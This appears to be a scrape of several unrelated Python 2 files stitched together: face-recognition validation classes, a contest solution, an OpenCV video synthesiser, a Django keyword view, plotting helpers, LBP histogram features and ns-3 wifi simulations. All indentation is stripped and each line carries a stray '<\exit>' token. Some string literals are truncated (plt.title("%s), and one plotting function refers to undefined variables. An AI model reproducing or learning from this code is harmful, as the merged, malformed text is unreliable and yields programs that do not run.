for validation_result in self.validation_results:<\exit>
print validation_result<\exit>
def __repr__(self):<\exit>
return "Validation Strategy (model=%s, results=%s)"%(self.model, self.validation_results)<\exit>
class KFoldCrossValidation(ValidationStrategy):<\exit>
def __init__(self, model, k=10, threshold_up=1, froze_shuffle=False, debug=True):<\exit>
super(KFoldCrossValidation, self).__init__(model=model)<\exit>
self.threshold_up = threshold_up<\exit>
self.k = k<\exit>
self.logger = logging.getLogger("facerec.validation.KFoldCrossValidation")<\exit>
self._debug = debug<\exit>
self.froze_shuffle = froze_shuffle<\exit>
def validate(self, X, y, description="ExperimentName"):<\exit>
if not self.froze_shuffle:<\exit>
X, y = shuffle(X, y)<\exit>
c = len(np.unique(y))<\exit>
foldIndices = []<\exit>
n = np.iinfo(np.int).max<\exit>
for i in range(0, c):<\exit>
idx = np.where(y == i)[0]<\exit>
n = min(n, idx.shape[0])<\exit>
foldIndices.append(idx.tolist());<\exit>
if n < self.k:<\exit>
self.k = n<\exit>
foldSize = int(math.floor(n / self.k))<\exit>
if self.threshold_up==0:<\exit>
threshold_r = [0]<\exit>
else:<\exit>
threshold_r = frange(0, self.threshold_up, 0.001)<\exit>
rates = {}<\exit>
for threshold in threshold_r:<\exit>
rates[threshold] = TFPN()<\exit>
for i in range(0, self.k):<\exit>
self.logger.info("Processing fold %d/%d." % (i + 1, self.k))<\exit>
l = int(i * foldSize)<\exit>
h = int((i + 1) * foldSize)<\exit>
testIdx = slice_2d(foldIndices, rows=range(0, c), cols=range(l, h))<\exit>
trainIdx = slice_2d(foldIndices, rows=range(0, c), cols=range(0, l))<\exit>
trainIdx.extend(slice_2d(foldIndices, rows=range(0, c), cols=range(h, n)))<\exit>
Xtrain = [X[t] for t in trainIdx]<\exit>
ytrain = y[trainIdx]<\exit>
self.model.compute(Xtrain, ytrain)<\exit>
predictions = {}<\exit>
for j in testIdx:<\exit>
predictions[j] = self.model.predict(X[j])<\exit>
if self.threshold_up == 0:<\exit>
rates[threshold] += self.simple_evaluate(testIdx, predictions, X, y)<\exit>
else:<\exit>
for threshold in threshold_r:<\exit>
rates[threshold] += self.binary_evaluate(testIdx, predictions, X, y, threshold)<\exit>
for threshold in threshold_r:<\exit>
r = rates[threshold]<\exit>
self.add(ValidationResult(r.TP, r.TN, r.FP, r.FN, threshold))<\exit>
def simple_evaluate(self, testIdX, predictions, X, y):<\exit>
r = TFPN()<\exit>
for j in testIdX:<\exit>
prediction, info = predictions[j]<\exit>
if prediction==y[j]:<\exit>
r.TP += 1<\exit>
else:<\exit>
r.FP += 1<\exit>
if self._debug:<\exit>
self.display_prediction_error(X[j], y[j], prediction)<\exit>
return r<\exit>
def display_prediction_error(self, data, actual, predicted):<\exit>
error_msg = "%d!=%d" % (actual, predicted)<\exit>
self.logger.debug("prediction error, actual!=predicted: " + error_msg)<\exit>
cv2.imshow(error_msg, data)<\exit>
cv2.waitKey(1)<\exit>
def binary_evaluate(self, testIdX, predictions, X, y, threshold):<\exit>
r = TFPN()<\exit>
for lbl in np.unique(y):<\exit>
for j in testIdX:<\exit>
_, info = predictions[j]<\exit>
labels = info['labels']<\exit>
idx = labels==lbl<\exit>
sims = info['similarities']<\exit>
sims = sims[idx]<\exit>
sims = sims[:1]<\exit>
score = np.sum(sims)/float(sims.size)<\exit>
if score>threshold:<\exit>
if lbl==y[j]:<\exit>
r.TP += 1<\exit>
else:<\exit>
r.FP += 1<\exit>
else:<\exit>
if lbl==y[j]:<\exit>
r.FN += 1<\exit>
else:<\exit>
r.TN += 1<\exit>
return r<\exit>
def __repr__(self):<\exit>
return "k-Fold Cross Validation (model=%s, k=%s, results=%s)" % (self.model, self.k, self.validation_results)<\exit>
class LeaveOneOutCrossValidation(ValidationStrategy):<\exit>
def __init__(self, model, k=0):<\exit>
super(LeaveOneOutCrossValidation, self).__init__(model=model)<\exit>
self.logger = logging.getLogger("facerec.validation.LeaveOneOutCrossValidation")<\exit>
self.k = k<\exit>
def validate(self, X, y, description="ExperimentName"):<\exit>
X, y = shuffle(X, y)<\exit>
true_positives, false_positives, true_negatives, false_negatives = (0, 0, 0, 0)<\exit>
if self.k==0:<\exit>
self.k = y.shape[0]<\exit>
for i in range(0, self.k):<\exit>
self.logger.info("Processing fold %d/%d." % (i + 1, self.k))<\exit>
trainIdx = []<\exit>
trainIdx.extend(range(0, i))<\exit>
trainIdx.extend(range(i + 1, self.k))<\exit>
Xtrain = [X[t] for t in trainIdx]<\exit>
ytrain = y[trainIdx]<\exit>
self.model.compute(Xtrain, ytrain)<\exit>
prediction = self.model.predict(X[i])[0]<\exit>
if prediction == y[i]:<\exit>
true_positives += 1<\exit>
else:<\exit>
false_positives += 1<\exit>
self.add(ValidationResult(true_positives, true_negatives, false_positives, false_negatives, description))<\exit>
def __repr__(self):<\exit>
return "Leave-One-Out Cross Validation (model=%s, results=%s)"%(self.model, self.validation_results)<\exit>
class LeaveOneClassOutCrossValidation(ValidationStrategy):<\exit>
def __init__(self, model):<\exit>
super(LeaveOneClassOutCrossValidation, self).__init__(model=model)<\exit>
self.logger = logging.getLogger("facerec.validation.LeaveOneClassOutCrossValidation")<\exit>
def validate(self, X, y, g, description="ExperimentName"):<\exit>
true_positives, false_positives, true_negatives, false_negatives = (0, 0, 0, 0)<\exit>
for i in range(0, len(np.unique(y))):<\exit>
self.logger.info("Validating Class %s." % i)<\exit>
trainIdx = np.where(y != i)[0]<\exit>
testIdx = np.where(y == i)[0]<\exit>
Xtrain = [X[t] for t in trainIdx]<\exit>
gtrain = g[trainIdx]<\exit>
self.model.compute(Xtrain, gtrain)<\exit>
for j in testIdx:<\exit>
prediction = self.model.predict(X[j])[0]<\exit>
if prediction == g[j]:<\exit>
true_positives += 1<\exit>
else:<\exit>
false_positives += 1<\exit>
self.add(ValidationResult(true_positives, true_negatives, false_positives, false_negatives, description))<\exit>
def __repr__(self):<\exit>
return "Leave-One-Class-Out Cross Validation (model=%s, results=%s)"%(self.model, self.validation_results)<\exit>
class SimpleValidation(ValidationStrategy):<\exit>
def __init__(self, model):<\exit>
super(SimpleValidation, self).__init__(model=model)<\exit>
self.logger = logging.getLogger("facerec.validation.SimpleValidation")<\exit>
def validate(self, Xtrain, ytrain, Xtest, ytest, description="ExperimentName"):<\exit>
self.logger.info("Simple Validation.")<\exit>
self.model.compute(Xtrain, ytrain)<\exit>
self.logger.debug("Model computed.")<\exit>
true_positives, false_positives, true_negatives, false_negatives = (0, 0, 0, 0)<\exit>
count = 0<\exit>
for i in ytest:<\exit>
self.logger.debug("Predicting %s/%s." % (count, len(ytest)))<\exit>
prediction = self.model.predict(Xtest[i])[0]<\exit>
if prediction == ytest[i]:<\exit>
true_positives += 1<\exit>
else:<\exit>
false_positives += 1<\exit>
count += 1<\exit>
self.add(ValidationResult(true_positives, true_negatives, false_positives, false_negatives, description))<\exit>
def __repr__(self):<\exit>
return "Simple Validation (model=%s)" % self.model<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
N, A = cipher<\exit>
l = N + 1<\exit>
E = 0<\exit>
for cur in A:<\exit>
k = 0<\exit>
for a in A:<\exit>
if a >= cur:<\exit>
k += 1<\exit>
E += float(l) / (k + 1)<\exit>
return "%.2f" % E<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("0.in", "r")<\exit>
solution = Solution()<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
N = int(f.readline().strip())<\exit>
A = map(int, f.readline().strip().split(' '))<\exit>
cipher = N, A<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
import numpy as np<\exit>
import cv2<\exit>
from time import clock<\exit>
from numpy import pi, sin, cos<\exit>
import common<\exit>
class VideoSynthBase(object):<\exit>
def __init__(self, size=None, noise=0.0, bg = None, **params):<\exit>
self.bg = None<\exit>
self.frame_size = (640, 480)<\exit>
if bg is not None:<\exit>
self.bg = cv2.imread(bg, 1)<\exit>
h, w = self.bg.shape[:2]<\exit>
self.frame_size = (w, h)<\exit>
if size is not None:<\exit>
w, h = map(int, size.split('x'))<\exit>
self.frame_size = (w, h)<\exit>
self.bg = cv2.resize(self.bg, self.frame_size)<\exit>
self.noise = float(noise)<\exit>
def render(self, dst):<\exit>
pass<\exit>
def read(self, dst=None):<\exit>
w, h = self.frame_size<\exit>
if self.bg is None:<\exit>
buf = np.zeros((h, w, 3), np.uint8)<\exit>
else:<\exit>
buf = self.bg.copy()<\exit>
self.render(buf)<\exit>
if self.noise > 0.0:<\exit>
noise = np.zeros((h, w, 3), np.int8)<\exit>
cv2.randn(noise, np.zeros(3), np.ones(3)*255*self.noise)<\exit>
buf = cv2.add(buf, noise, dtype=cv2.CV_8UC3)<\exit>
return True, buf<\exit>
class Chess(VideoSynthBase):<\exit>
def __init__(self, **kw):<\exit>
super(Chess, self).__init__(**kw)<\exit>
w, h = self.frame_size<\exit>
self.grid_size = sx, sy = 10, 7<\exit>
white_quads = []<\exit>
black_quads = []<\exit>
for i, j in np.ndindex(sy, sx):<\exit>
q = [[j, i, 0], [j+1, i, 0], [j+1, i+1, 0], [j, i+1, 0]]<\exit>
[white_quads, black_quads][(i + j) % 2].append(q)<\exit>
self.white_quads = np.float32(white_quads)<\exit>
self.black_quads = np.float32(black_quads)<\exit>
fx = 0.9<\exit>
self.K = np.float64([[fx*w, 0, 0.5*(w-1)],<\exit>
[0, fx*w, 0.5*(h-1)],<\exit>
[0.0,0.0,      1.0]])<\exit>
self.dist_coef = np.float64([-0.2, 0.1, 0, 0])<\exit>
self.t = 0<\exit>
def draw_quads(self, img, quads, color = (0, 255, 0)):<\exit>
img_quads = cv2.projectPoints(quads.reshape(-1, 3), self.rvec, self.tvec, self.K, self.dist_coef) [0]<\exit>
img_quads.shape = quads.shape[:2] + (2,)<\exit>
for q in img_quads:<\exit>
cv2.fillConvexPoly(img, np.int32(q*4), color, cv2.CV_AA, shift=2)<\exit>
def render(self, dst):<\exit>
t = self.t<\exit>
self.t += 1.0/30.0<\exit>
sx, sy = self.grid_size<\exit>
center = np.array([0.5*sx, 0.5*sy, 0.0])<\exit>
phi = pi/3 + sin(t*3)*pi/8<\exit>
c, s = cos(phi), sin(phi)<\exit>
ofs = np.array([sin(1.2*t), cos(1.8*t), 0]) * sx * 0.2<\exit>
eye_pos = center + np.array([cos(t)*c, sin(t)*c, s]) * 15.0 + ofs<\exit>
target_pos = center + ofs<\exit>
R, self.tvec = common.lookat(eye_pos, target_pos)<\exit>
self.rvec = common.mtx2rvec(R)<\exit>
self.draw_quads(dst, self.white_quads, (245, 245, 245))<\exit>
self.draw_quads(dst, self.black_quads, (10, 10, 10))<\exit>
classes = dict(chess=Chess)<\exit>
def create_capture(source):<\exit>
try: source = int(source)<\exit>
except ValueError: pass<\exit>
else:<\exit>
return cv2.VideoCapture(source)<\exit>
source = str(source).strip()<\exit>
if source.startswith('synth'):<\exit>
ss = filter(None, source.split(':'))<\exit>
params = dict( s.split('=') for s in ss[1:] )<\exit>
try: Class = classes[params['class']]<\exit>
except: Class = VideoSynthBase<\exit>
return Class(**params)<\exit>
return cv2.VideoCapture(source)<\exit>
presets = dict(<\exit>
empty = 'synth:',<\exit>
lena = 'synth:bg=../cpp/lena.jpg:noise=0.1',<\exit>
chess = 'synth:class=chess:bg=../cpp/lena.jpg:noise=0.1:size=640x480'<\exit>
)<\exit>
if __name__ == '__main__':<\exit>
import sys<\exit>
import getopt<\exit>
print 'USAGE: video.py [--shotdir <dir>] [source0] [source1] ...'<\exit>
print "source: '<int>' or '<filename>' or 'synth:<params>'"<\exit>
print<\exit>
args, sources = getopt.getopt(sys.argv[1:], '', 'shotdir=')<\exit>
args = dict(args)<\exit>
shotdir = args.get('--shotdir', '.')<\exit>
if len(sources) == 0:<\exit>
sources = [ presets['chess'] ]<\exit>
print 'Press SPACE to save current frame'<\exit>
caps = map(create_capture, sources)<\exit>
shot_idx = 0<\exit>
while True:<\exit>
imgs = []<\exit>
for i, cap in enumerate(caps):<\exit>
ret, img = cap.read()<\exit>
imgs.append(img)<\exit>
cv2.imshow('capture %d' % i, img)<\exit>
ch = cv2.waitKey(1)<\exit>
if ch == 27:<\exit>
break<\exit>
if ch == ord(' '):<\exit>
for i, img in enumerate(imgs):<\exit>
fn = '%s/shot_%d_%03d.bmp' % (shotdir, i, shot_idx)<\exit>
cv2.imwrite(fn, img)<\exit>
print fn, 'saved'<\exit>
shot_idx += 1<\exit>
import json<\exit>
from django.http import HttpResponse<\exit>
from django.shortcuts import render<\exit>
from django.template.response import SimpleTemplateResponse<\exit>
from django.utils.decorators import method_decorator<\exit>
from django.views.decorators.csrf import csrf_exempt<\exit>
from django.views.generic import TemplateView, View<\exit>
from rake import rake<\exit>
class MainView(View):<\exit>
template_name = "tagging.html"<\exit>
@method_decorator(csrf_exempt)<\exit>
def dispatch(self, *args, **kwargs):<\exit>
return super(MainView, self).dispatch(*args, **kwargs)<\exit>
def get(self, request, *args, **kwargs):<\exit>
return SimpleTemplateResponse(MainView.template_name)<\exit>
def post(self, request):<\exit>
dic = json.loads(request.body)<\exit>
ret = rake.Rake().run(dic["text"])<\exit>
ret = filter(lambda x: len(x.split(" ")) > 1, map(lambda x: x[0], ret))<\exit>
ret = {"keywords": list(ret)}<\exit>
return HttpResponse(json.dumps(ret))<\exit>
from facerec_py.facerec.normalization import minmax<\exit>
import os as os<\exit>
import numpy as np<\exit>
import matplotlib.pyplot as plt<\exit>
import matplotlib.cm as cm<\exit>
try:<\exit>
from PIL import Image<\exit>
except ImportError:<\exit>
import Image<\exit>
import math as math<\exit>
def create_font(fontname='Tahoma', fontsize=10):<\exit>
return { 'fontname': fontname, 'fontsize':fontsize }<\exit>
def plot_gray(X,  sz=None, filename=None):<\exit>
if not sz is None:<\exit>
X = X.reshape(sz)<\exit>
X = minmax(I, 0, 255)<\exit>
fig = plt.figure()<\exit>
implot = plt.imshow(np.asarray(Ig), cmap=cm.gray)<\exit>
if filename is None:<\exit>
plt.show()<\exit>
else:<\exit>
fig.savefig(filename, format="png", transparent=False)<\exit>
def plot_eigenvectors(eigenvectors, num_components, sz, filename=None, start_component=0, rows = None, cols = None, title="Subplot", color=True):<\exit>
if (rows is None) or (cols is None):<\exit>
rows = cols = int(math.ceil(np.sqrt(num_components)))<\exit>
num_components = np.min(num_components, eigenvectors.shape[1])<\exit>
fig = plt.figure()<\exit>
for i in range(start_component, num_components):<\exit>
vi = eigenvectors[0:,i].copy()<\exit>
vi = minmax(np.asarray(vi), 0, 255, dtype=np.uint8)<\exit>
vi = vi.reshape(sz)<\exit>
ax0 = fig.add_subplot(rows,cols,(i-start_component)+1)<\exit>
plt.setp(ax0.get_xticklabels(), visible=False)<\exit>
plt.setp(ax0.get_yticklabels(), visible=False)<\exit>
plt.title("%s<\exit>
if color:<\exit>
implot = plt.imshow(np.asarray(vi))<\exit>
else:<\exit>
implot = plt.imshow(np.asarray(vi), cmap=cm.grey)<\exit>
if filename is None:<\exit>
fig.show()<\exit>
else:<\exit>
fig.savefig(filename, format="png", transparent=False)<\exit>
def subplot(title, images, rows, cols, sptitle="subplot", sptitles=[], colormap=cm.gray, ticks_visible=True, filename=None):<\exit>
fig = plt.figure()<\exit>
fig.text(.5, .95, title, horizontalalignment='center')<\exit>
for i in xrange(len(images)):<\exit>
ax0 = fig.add_subplot(rows,cols,(i+1))<\exit>
plt.setp(ax0.get_xticklabels(), visible=False)<\exit>
plt.setp(ax0.get_yticklabels(), visible=False)<\exit>
if len(sptitles) == len(images):<\exit>
plt.title("%s<\exit>
else:<\exit>
plt.title("%s<\exit>
plt.imshow(np.asarray(images[i]), cmap=colormap)<\exit>
if filename is None:<\exit>
plt.show()<\exit>
else:<\exit>
fig.savefig(filename)<\exit>
from expr.feature import *<\exit>
class WeightedHS(SpatialHistogram):<\exit>
def __init__(self, lbp_operator=ExtendedLBP(3), sz=(8, 8), X=None, y=None):<\exit>
super(WeightedHS, self).__init__(lbp_operator, sz)<\exit>
self.weights = {}<\exit>
self.Hs = {}<\exit>
self.L = self.calculate_L(X)<\exit>
self.X = X<\exit>
self.y = y<\exit>
def init_cache(self):<\exit>
self.weights = {}<\exit>
self.Hs = {}<\exit>
def compute(self, X, y):<\exit>
raise NotImplementedError("Not and won't be implemented.")<\exit>
def hist_intersect(self, p, q):<\exit>
p = np.asarray(p).flatten()<\exit>
q = np.asarray(q).flatten()<\exit>
sim = np.sum(np.minimum(p, q))<\exit>
return sim<\exit>
def get_weight(self, row, col):<\exit>
args = (row, col)<\exit>
if args not in self.weights:<\exit>
self.weights[args] = self._get_weight(row, col)<\exit>
return self.weights[args]<\exit>
def _get_weight(self, row, col):<\exit>
C = len(np.unique(self.y))<\exit>
m_I = 0<\exit>
for i in np.unique(self.y):<\exit>
N_i = self.get_N(i)<\exit>
Hs_i = self.get_Hs(i, row, col)<\exit>
for k in xrange(len(Hs_i)):<\exit>
for j in xrange(k):<\exit>
m_I += self.hist_intersect(Hs_i[j], Hs_i[k])<\exit>
m_I *= 2.0/(N_i*(N_i-1))<\exit>
m_I *= 1.0/C<\exit>
S2_I = 0<\exit>
for i in np.unique(self.y):<\exit>
Hs_i = self.get_Hs(i, row, col)<\exit>
for k in xrange(len(Hs_i)):<\exit>
for j in xrange(k):<\exit>
S2_I += (self.hist_intersect(Hs_i[j], Hs_i[k])-m_I)**2<\exit>
m_E = 0<\exit>
for i in np.unique(self.y):<\exit>
for j in np.unique(self.y[self.y != i]):<\exit>
N_i = self.get_N(i)<\exit>
N_j = self.get_N(j)<\exit>
Hs_i = self.get_Hs(i, row, col)<\exit>
Hs_j = self.get_Hs(j, row, col)<\exit>
for h_i in Hs_i:<\exit>
for h_j in Hs_j:<\exit>
m_E += self.hist_intersect(h_i, h_j)<\exit>
m_E *= 1.0/(N_i*N_j)<\exit>
m_E *= 2.0/(C*(C-1))<\exit>
S2_E = 0<\exit>
for i in np.unique(self.y):<\exit>
for j in np.unique(self.y[self.y!=i]):<\exit>
Hs_i = self.get_Hs(i, row, col)<\exit>
Hs_j = self.get_Hs(j, row, col)<\exit>
for h_i in Hs_i:<\exit>
for h_j in Hs_j:<\exit>
S2_E += (self.hist_intersect(h_i, h_j)-m_E)**2<\exit>
weight = (m_I-m_E)**2/(S2_I+S2_E)<\exit>
return weight<\exit>
def get_N(self, i):<\exit>
return len(self.X[self.y==i])<\exit>
def calculate_L(self, X):<\exit>
L = []<\exit>
for x in X:<\exit>
L.append(self.lbp_operator(x))<\exit>
return np.asarray(L)<\exit>
def get_Hs(self, label, row, col):<\exit>
args = (label, row, col)<\exit>
if args not in self.Hs:<\exit>
self.Hs[args] = self._get_Hs(label, row, col)<\exit>
return self.Hs[args]<\exit>
def _get_Hs(self, label, row, col):<\exit>
L = self.L[self.y==label]<\exit>
Hs = []<\exit>
for l in L:<\exit>
lbp_height, lbp_width = l.shape<\exit>
grid_rows, grid_cols = self.sz<\exit>
py = int(np.floor(lbp_height / grid_rows))<\exit>
px = int(np.floor(lbp_width / grid_cols))<\exit>
C = l[row * py:(row + 1) * py, col * px:(col + 1) * px]<\exit>
Hs.append(super(WeightedHS, self)._get_histogram(C, row, col))<\exit>
return Hs<\exit>
def _get_histogram(self, C, row, col, normed=True):<\exit>
return self.get_weight(row, col)* \<\exit>
super(WeightedHS, self)._get_histogram(C, row, col)<\exit>
class ConcatendatedWeightedHS(SpatialHistogram):<\exit>
def __init__(self, lbp_operator=ExtendedLBP(radius=3), sz=(8, 8)):<\exit>
super(ConcatendatedWeightedHS, self).__init__(lbp_operator, sz)<\exit>
self.weights = None<\exit>
def compute(self, X, y):<\exit>
self.weights = self.construct_wights(X, y)<\exit>
super(ConcatendatedWeightedHS, self).compute(X, y)<\exit>
def construct_wights(self, X, y):<\exit>
X = np.asarray(X)<\exit>
n_gabors = X.shape[1]<\exit>
weights = [WeightedHS(X=X[:, i, :, :], y=y) for i in xrange(n_gabors)]<\exit>
return weights<\exit>
def spatially_enhanced_histogram(self, X):<\exit>
hists = []<\exit>
for gabor_idx, x in enumerate(X):<\exit>
hist = self.weights[gabor_idx].spatially_enhanced_histogram(x)<\exit>
hists.extend(hist)<\exit>
return np.asarray(hists)<\exit>
class WeightedLGBPHS(ChainedFeature):<\exit>
def __init__(self, n_orient=4, n_scale=2, lbp_operator=ExtendedLBP(radius=3)):<\exit>
gabor = GaborFilterCv2(n_orient, n_scale)<\exit>
lbp_hist = ConcatendatedWeightedHS(lbp_operator=lbp_operator)<\exit>
super(WeightedLGBPHS, self).__init__(gabor, lbp_hist)<\exit>
import sys<\exit>
import ns.applications<\exit>
import ns.core<\exit>
import ns.internet<\exit>
import ns.mobility<\exit>
import ns.network<\exit>
import ns.point_to_point<\exit>
import ns.wifi<\exit>
def SetPosition(node, position):<\exit>
mobility = node.GetObject(ns.mobility.MobilityModel.GetTypeId())<\exit>
mobility.SetPosition(position)<\exit>
def GetPosition(node):<\exit>
mobility = node.GetObject(ns.mobility.MobilityModel.GetTypeId())<\exit>
return mobility.GetPosition()<\exit>
def AdvancePosition(node):<\exit>
pos = GetPosition(node);<\exit>
pos.x += 5.0<\exit>
if pos.x >= 210.0:<\exit>
return<\exit>
SetPosition(node, pos)<\exit>
ns.core.Simulator.Schedule(ns.core.Seconds(1.0), AdvancePosition, node)<\exit>
def main(argv):<\exit>
ns.core.CommandLine().Parse(argv)<\exit>
ns.network.Packet.EnablePrinting();<\exit>
ns.core.Config.SetDefault("ns3::WifiRemoteStationManager::RtsCtsThreshold", ns.core.StringValue("0"))<\exit>
ns.core.Config.SetDefault("ns3::WifiRemoteStationManager::FragmentationThreshold", ns.core.StringValue("2200"))<\exit>
wifi = ns.wifi.WifiHelper.Default()<\exit>
mobility = ns.mobility.MobilityHelper()<\exit>
stas = ns.network.NodeContainer()<\exit>
ap = ns.network.NodeContainer()<\exit>
packetSocket = ns.network.PacketSocketHelper()<\exit>
stas.Create(2)<\exit>
ap.Create(1)<\exit>
packetSocket.Install(stas)<\exit>
packetSocket.Install(ap)<\exit>
wifiPhy = ns.wifi.YansWifiPhyHelper.Default()<\exit>
wifiChannel = ns.wifi.YansWifiChannelHelper.Default()<\exit>
wifiPhy.SetChannel(wifiChannel.Create())<\exit>
ssid = ns.wifi.Ssid("wifi-default")<\exit>
wifi.SetRemoteStationManager("ns3::ArfWifiManager")<\exit>
wifiMac = ns.wifi.NqosWifiMacHelper.Default()<\exit>
wifiMac.SetType("ns3::StaWifiMac",<\exit>
"Ssid", ns.wifi.SsidValue(ssid),<\exit>
"ActiveProbing", ns.core.BooleanValue(False))<\exit>
staDevs = wifi.Install(wifiPhy, wifiMac, stas)<\exit>
wifiMac.SetType("ns3::ApWifiMac",<\exit>
"Ssid", ns.wifi.SsidValue(ssid),<\exit>
"BeaconGeneration", ns.core.BooleanValue(True),<\exit>
"BeaconInterval", ns.core.TimeValue(ns.core.Seconds(2.5)))<\exit>
wifi.Install(wifiPhy, wifiMac, ap)<\exit>
mobility.Install(stas)<\exit>
mobility.Install(ap)<\exit>
ns.core.Simulator.Schedule(ns.core.Seconds(1.0), AdvancePosition, ap.Get(0))<\exit>
socket = ns.network.PacketSocketAddress()<\exit>
socket.SetSingleDevice(staDevs.Get(0).GetIfIndex())<\exit>
socket.SetPhysicalAddress(staDevs.Get(1).GetAddress())<\exit>
socket.SetProtocol(1)<\exit>
onoff = ns.applications.OnOffHelper("ns3::PacketSocketFactory", ns.network.Address(socket))<\exit>
onoff.SetAttribute("OnTime", ns.core.RandomVariableValue(ns.core.ConstantVariable(42)))<\exit>
onoff.SetAttribute("OffTime", ns.core.RandomVariableValue(ns.core.ConstantVariable(0)))<\exit>
apps = onoff.Install(ns.network.NodeContainer(stas.Get(0)))<\exit>
apps.Start(ns.core.Seconds(0.5))<\exit>
apps.Stop(ns.core.Seconds(43.0))<\exit>
ns.core.Simulator.Stop(ns.core.Seconds(44.0))<\exit>
ns.core.Simulator.Run()<\exit>
ns.core.Simulator.Destroy()<\exit>
return 0<\exit>
if __name__ == '__main__':<\exit>
sys.exit(main(sys.argv))<\exit>
import sys<\exit>
import ns.applications<\exit>
import ns.core<\exit>
import ns.flow_monitor<\exit>
import ns.internet<\exit>
import ns.mobility<\exit>
import ns.network<\exit>
import ns.olsr<\exit>
import ns.wifi<\exit>
DISTANCE = 100<\exit>
NUM_NODES_SIDE = 3<\exit>
def main(argv):<\exit>
cmd = ns.core.CommandLine()<\exit>
cmd.NumNodesSide = None<\exit>
cmd.AddValue("NumNodesSide", "Grid side number of nodes (total number of nodes will be this number squared)")<\exit>
cmd.Results = None<\exit>
cmd.AddValue("Results", "Write XML results to file")<\exit>
cmd.Plot = None<\exit>
cmd.AddValue("Plot", "Plot the results using the matplotlib python module")<\exit>
cmd.Parse(argv)<\exit>
wifi = ns.wifi.WifiHelper.Default()<\exit>
wifiMac = ns.wifi.NqosWifiMacHelper.Default()<\exit>
wifiPhy = ns.wifi.YansWifiPhyHelper.Default()<\exit>
wifiChannel = ns.wifi.YansWifiChannelHelper.Default()<\exit>
wifiPhy.SetChannel(wifiChannel.Create())<\exit>
ssid = ns.wifi.Ssid("wifi-default")<\exit>
wifi.SetRemoteStationManager("ns3::ArfWifiManager")<\exit>
wifiMac.SetType ("ns3::AdhocWifiMac",<\exit>
"Ssid", ns.wifi.SsidValue(ssid))<\exit>
internet = ns.internet.InternetStackHelper()<\exit>
list_routing = ns.internet.Ipv4ListRoutingHelper()<\exit>
olsr_routing = ns.olsr.OlsrHelper()<\exit>
static_routing = ns.internet.Ipv4StaticRoutingHelper()<\exit>
list_routing.Add(static_routing, 0)<\exit>
list_routing.Add(olsr_routing, 100)<\exit>
internet.SetRoutingHelper(list_routing)<\exit>
ipv4Addresses = ns.internet.Ipv4AddressHelper()<\exit>
ipv4Addresses.SetBase(ns.network.Ipv4Address("10.0.0.0"), ns.network.Ipv4Mask("255.255.255.0"))<\exit>
port = 9<\exit>
onOffHelper = ns.applications.OnOffHelper("ns3::UdpSocketFactory",<\exit>
ns.network.Address(ns.network.InetSocketAddress(ns.network.Ipv4Address("10.0.0.1"), port)))<\exit>
onOffHelper.SetAttribute("DataRate", ns.network.DataRateValue(ns.network.DataRate("100kbps")))<\exit>
onOffHelper.SetAttribute("OnTime", ns.core.RandomVariableValue(ns.core.ConstantVariable(1)))<\exit>
onOffHelper.SetAttribute("OffTime", ns.core.RandomVariableValue(ns.core.ConstantVariable(0)))<\exit>
addresses = []<\exit>
nodes = []<\exit>
if cmd.NumNodesSide is None:<\exit>
num_nodes_side = NUM_NODES_SIDE<\exit>
else:<\exit>
num_nodes_side = int(cmd.NumNodesSide)<\exit>
for xi in range(num_nodes_side):<\exit>
for yi in range(num_nodes_side):<\exit>
node = ns.network.Node()<\exit>
nodes.append(node)<\exit>
internet.Install(ns.network.NodeContainer(node))<\exit>
mobility = ns.mobility.ConstantPositionMobilityModel()<\exit>
mobility.SetPosition(ns.core.Vector(xi*DISTANCE, yi*DISTANCE, 0))<\exit>
node.AggregateObject(mobility)<\exit>
devices = wifi.Install(wifiPhy, wifiMac, node)<\exit>
ipv4_interfaces = ipv4Addresses.Assign(devices)<\exit>
addresses.append(ipv4_interfaces.GetAddress(0))<\exit>
for i, node in enumerate(nodes):<\exit>
destaddr = addresses[(len(addresses) - 1 - i) % len(addresses)]<\exit>
onOffHelper.SetAttribute("Remote", ns.network.AddressValue(ns.network.InetSocketAddress(destaddr, port)))<\exit>
app = onOffHelper.Install(ns.network.NodeContainer(node))<\exit>
app.Start(ns.core.Seconds(ns.core.UniformVariable(20, 30).GetValue()))<\exit>
flowmon_helper = ns.flow_monitor.FlowMonitorHelper()<\exit>
monitor = flowmon_helper.InstallAll()<\exit>
monitor = flowmon_helper.GetMonitor()<\exit>
monitor.SetAttribute("DelayBinWidth", ns.core.DoubleValue(0.001))<\exit>
monitor.SetAttribute("JitterBinWidth", ns.core.DoubleValue(0.001))<\exit>
monitor.SetAttribute("PacketSizeBinWidth", ns.core.DoubleValue(20))<\exit>
ns.core.Simulator.Stop(ns.core.Seconds(44.0))<\exit>
ns.core.Simulator.Run()<\exit>
def print_stats(os, st):<\exit>
print >> os, "  Tx Bytes: ", st.txBytes<\exit>
print >> os, "  Rx Bytes: ", st.rxBytes<\exit>
print >> os, "  Tx Packets: ", st.txPackets<\exit>
print >> os, "  Rx Packets: ", st.rxPackets<\exit>
print >> os, "  Lost Packets: ", st.lostPackets<\exit>
if st.rxPackets > 0:<\exit>
print >> os, "  Mean{Delay}: ", (st.delaySum.GetSeconds() / st.rxPackets)<\exit>
print >> os, "  Mean{Jitter}: ", (st.jitterSum.GetSeconds() / (st.rxPackets-1))<\exit>
print >> os, "  Mean{Hop Count}: ", float(st.timesForwarded) / st.rxPackets + 1<\exit>
if 0:<\exit>
print >> os, "Delay Histogram"<\exit>
for i in range(st.delayHistogram.GetNBins () ):<\exit>
print >> os, " ",i,"(", st.delayHistogram.GetBinStart (i), "-", \<\exit>
st.delayHistogram.GetBinEnd (i), "): ", st.delayHistogram.GetBinCount (i)<\exit>
print >> os, "Jitter Histogram"<\exit>
for i in range(st.jitterHistogram.GetNBins () ):<\exit>
print >> os, " ",i,"(", st.jitterHistogram.GetBinStart (i), "-", \<\exit>
st.jitterHistogram.GetBinEnd (i), "): ", st.jitterHistogram.GetBinCount (i)<\exit>
print >> os, "PacketSize Histogram"<\exit>
for i in range(st.packetSizeHistogram.GetNBins () ):<\exit>
print >> os, " ",i,"(", st.packetSizeHistogram.GetBinStart (i), "-", \<\exit>
st.packetSizeHistogram.GetBinEnd (i), "): ", st.packetSizeHistogram.GetBinCount (i)<\exit>
for reason, drops in enumerate(st.packetsDropped):<\exit>
print "  Packets dropped by reason %i: %i" % (reason, drops)<\exit>
